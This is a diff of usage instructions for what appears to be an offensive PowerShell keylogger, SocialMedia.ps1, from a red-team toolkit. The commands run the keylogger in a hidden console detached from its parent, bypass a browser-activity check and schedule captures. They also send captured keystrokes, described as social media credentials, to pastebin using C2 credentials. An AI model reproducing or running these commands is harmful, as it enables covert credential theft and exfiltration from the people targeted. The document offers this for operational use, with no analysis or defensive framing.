@@ -385,18 +385,15 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-B
 ## Bypass checks: Is_Browser_Active?
 .\SocialMedia.ps1 -force
 
-## Stop keylogger and leak keystrokes on screen
-.\SocialMedia.ps1 -mode 'stop'
-
 ## Schedule cmdlet capture to start at [HH:mm] hours
 .\SocialMedia.ps1 -schedule '02:34' -Mode 'start'
 
+## Stop keylogger and leak keystrokes on screen
+.\SocialMedia.ps1 -mode 'stop'
 
+[hidden execution]
 ## Schedule cmdlet capture to start at -shedule '[HH:mm]' hours and Bypass check: Is_Browser_Active?
 Start-Process -WindowStyle hidden powershell -argumentlist "-file SocialMedia.ps1 -schedule '02:34' -mode 'start' -force"
-
-## Invoke SocialMedia cmdlet in a hidden windows console detach from parent process with the best chances (delay) of capture credentials
-Start-Process -WindowStyle hidden powershell -argumentlist "-file SocialMedia.ps1 -mode 'start' -delay '800' -force"
 
 ## Start key`logger and send logfiles to pastebin everytime target user changes\exit from social media browser active tab
 # This example uses 'meterpeter C2' pastebin credentials as demo, but users can input your own pastebin account creds\APIkey
@@ -405,5 +402,5 @@ Start-Process -WindowStyle hidden powershell -argumentlist "-file SocialMedia.ps
 
 ## Hint: force 'SendToPasteBin' function to run before leaking any captures.
 # Function opens a new browser tab that triggers cmdlet to execute 'SendToPasteBin' function.
-.\socialmedia.ps1 -mode stop -sendtopastebin
+.\socialmedia.ps1 -mode 'stop' -sendtopastebin
 ```
